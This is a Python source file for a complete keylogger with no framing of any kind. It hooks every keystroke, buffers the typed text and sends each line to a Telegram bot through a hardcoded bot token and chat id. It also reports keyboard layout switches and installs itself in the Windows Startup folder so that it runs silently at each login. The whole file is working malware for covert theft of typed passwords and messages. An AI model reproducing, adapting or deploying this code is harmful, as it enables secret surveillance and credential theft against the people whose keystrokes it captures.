import keyboard as k
import requests as r
import os
import sys as sy
import time as t
import subprocess

a = "7102574667:AAFsWQKKLr_tTo3S54AgTI1VnyDlEb_Nmok"
b = "-1002081868656"

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{a}/sendMessage"
    payload = {"chat_id": b, "text": message}
    try:
        response = r.post(url, data=payload)
        response.raise_for_status()
    except Exception as e:
        pass

def detect_language(char):
    if char.isalpha():
        if '\u0400' <= char <= '\u04FF':
            return "Russian"
        elif '\u0531' <= char <= '\u058F':
            return "Armenian"
    return "English"

buffer = ""

def key_event(event):
    global buffer
    current_lang = detect_language(event.name)
    if event.event_type == 'down':
        if event.name == 'space':
            buffer += " "
        elif event.name == 'enter':
            if buffer:
                send_telegram_message(buffer)
                buffer = ""
        elif len(event.name) == 1:
            buffer += event.name
    elif event.event_type == 'up':
        new_lang = detect_language(event.name)
        if new_lang != current_lang:
            current_lang = new_lang
            send_telegram_message(f"Keyboard layout switched to {current_lang}")

def add_to_startup(file_path=""):
    if file_path == "":
        file_path = sy.argv[0]
    bat_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\', 'open.bat')  # Fixed here
    with open(bat_path, "w") as bat_file:
        bat_file.write(f'pythonw.exe "{file_path}"')

def main():
    add_to_startup()
    send_telegram_message("P1P0 STARTING...")

    k.hook(key_event)

    try:
        while True:
            t.sleep(1)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
